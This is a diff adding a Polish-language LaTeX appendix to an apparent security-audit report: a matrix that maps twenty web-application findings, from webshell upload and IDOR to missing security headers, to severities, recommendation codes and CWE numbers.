+\section{Załącznik B --- Macierz ustaleń (finding \texorpdfstring{$\rightarrow$}{->} R \texorpdfstring{$\rightarrow$}{->} CWE)}
+\label{app:matrix}
+\begin{center}
+\begin{longtable}{@{}c L c c l@{}}
+\toprule
+\textbf{\#} & \textbf{Ustalenie} & \textbf{Istotność} & \textbf{R} & \textbf{CWE} \\
+\midrule
+\endhead
+1 & PHP2Shell (CVE-2026-109618/619) & \sev{crit}{Critical} & R1 & --- \\
+2 & Upload $\rightarrow$ webshell RCE & \sev{crit}{Critical} & R2 & 434 \\
+3 & IDOR (notatki/wizyty/załączniki) & \sev{high}{High} & R3 & 639 \\
+4 & Eskalacja roli (mass-assignment) & \sev{high}{High} & R4 & 915/269 \\
+5 & Broken access control (admin) & \sev{high}{High} & R4 & 285 \\
+6 & Path traversal (download) & \sev{high}{High} & R2 & 22 \\
+7 & Stored XSS (notatka) & \sev{med}{Medium} & R5 & 79 \\
+8 & Słaby token resetu & \sev{med}{Medium} & R6 & 640 \\
+9 & Fixacja sesji & \sev{med}{Medium} & R7 & 384 \\
+10 & SQL injection (search) & \sev{med}{Medium} & R8 & 89 \\
+11 & Publiczny bucket MinIO & \sev{med}{Medium} & R3 & 552 \\
+12 & CSRF & \sev{med}{Medium} & R4 & 352 \\
+13 & Niesolone MD5 & \sev{med}{Medium} & R6 & 916 \\
+14 & Host header injection (reset) & \sev{med}{Medium} & R6 & 640 \\
+15 & Enumeracja kont & \sev{low}{Low} & R10 & 203 \\
+16 & Ujawnienie informacji (phpinfo/errors) & \sev{low}{Low} & R9 & 200 \\
+17 & Ujawnione nagłówki wersji & \sev{low}{Info} & R9 & 200 \\
+18 & Brak nagłówków bezpieczeństwa & \sev{low}{Low} & R9 & 693 \\
+19 & Redis bez AUTH & \sev{low}{Low} & R7 & 306 \\
+20 & Sekrety w \texttt{.env} & \sev{low}{Low} & R9 & 798 \\
+\bottomrule
+\end{longtable}
+\end{center}
+
+\end{document}
